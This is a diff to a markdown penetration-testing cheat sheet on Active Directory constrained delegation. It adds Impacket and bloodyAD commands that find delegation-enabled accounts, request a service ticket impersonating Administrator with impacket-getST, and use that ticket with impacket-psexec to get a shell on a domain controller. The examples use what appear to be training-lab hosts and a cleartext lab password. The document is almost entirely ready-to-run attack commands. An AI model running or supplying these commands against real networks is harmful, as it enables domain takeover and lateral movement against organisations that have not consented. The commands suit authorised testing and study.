@@ -68,8 +68,11 @@
 
 ### Identify a Constrained Delegation
 
+* **Impacket find Delegation**  
+  ```bash
+  Impacket-findDelegation <domain>/<username>:<password> -dc-ip<DC IP>
+  ```
 * **bloodyAD:**  
-
   ```bash
   bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))' --attr sAMAccountName,msds-allowedtodelegateto
   ```
@@ -77,8 +80,17 @@
 ### Exploit the Constrained Delegation
 
 * **Impacket**  
-
   ```bash
-  Impacket-getST -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
-  ```
+  Impacket-getST -spn <SPN> 'DOMAIN/user:password' -impersonate Administrator -dc-ip <DC IP>
 
+  #Example
+  impacket-getST -spn TERMSRV/DC01 'inlanefreight.local/beth.richards:B3thR!ch@rd$' -impersonate Administrator -dc-ip 10.129.205.35
+  ```
+### Using the new ticket with PSExec
+  ```bash
+  export KRB5CCNAME=<CCACHE>
+  Impacket-psexec -k -no-pass <domain>/<user>@host -debug
+
+  # Example
+  impacket-psexec -k -no-pass inlanefreight.local/administrator@dc01
+  ```
